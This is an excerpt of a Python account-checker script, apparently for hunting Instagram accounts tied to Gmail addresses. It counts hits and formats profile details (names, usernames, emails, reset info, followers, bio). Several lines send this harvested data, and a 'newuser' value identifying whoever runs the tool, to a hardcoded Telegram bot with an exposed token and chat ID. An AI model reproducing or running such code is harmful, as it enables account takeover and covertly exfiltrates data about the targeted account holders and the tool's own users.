...
'''
try:
    requests.get(f"https://api.telegram.org/bot7750355625:AAFPVu_KWm1XTPS2VvVUCUCaAZtAAdZB2jk/sendMessage?chat_id=7757666324&text={newuser}")
...
def pppp():
    ...
    output = (f"\n"
          f"{Fore.GREEN}𝐓𝐎𝐎𝐋 𝐁𝐘 #𝐅𝐄𝐘𝐁𝐄𝐃\n"
          f"≿━━━━━━━━༺❀༻━━━━━━━━≾\n"
          
          f"│ 🌸 ʜɪᴛ :   {hits} │\n"
          f"│ 🔄 ʙᴀᴅ ɪɴsᴛᴀ:    {badinsta} │\n"
          f"│ 💔 ʙᴀᴅ :  {bademail} │\n"
          f"│ 🔍 ɢᴏᴏᴅ :    {goodig} │\n"
                 f"≿━━━━━━━━༺❀༻━━━━━━━━≾\n\n")
...
# ASCII Art Display for 5 seconds
output = (f"""{Fore.RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣷⡒⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣆⠙⡄⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤⣤⣤⣤⣤⣤⣤⣤⠤⢄⡀⠀⠀⣿⣿⣿⣿⣿⣿⡆⠘⡄⠀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
...
🌷   ɴᴀᴍᴇ        : ﴾ {full_name} ﴿
🌼   ᴜsᴇʀɴᴀᴍᴇ    : ﴾ @{username} ﴿
🌷 📧 ᴍᴀɪʟ       : ﴾ {username}@gmail.com ﴿
🌼 ♻️  ʀᴇsᴇᴛ       : ﴾ {rest(username)} ﴿
🌷 👥ғᴏʟʟᴏᴡᴇʀ   : ﴾ {fows} ﴿
🌼 ➡️  ғᴏʟʟᴏᴡɪɴɢ   : ﴾ {fowg} ﴿
🌷 📝  ᴘᴏsᴛ       : ﴾ {pp} ﴿
🌼 🧾 ʙɪᴏ        : ﴾ {bio} ﴿
...
'''
    ...
    try:
        try:
            requests.get(f"https://api.telegram.org/bot7750355625:AAFPVu_KWm1XTPS2VvVUCUCaAZtAAdZB2jk/sendMessage?chat_id=7757666324&text={ID}\n{ss}")
            print(ss)
        except Exception as e:
            print(f"  h ") 
        try:
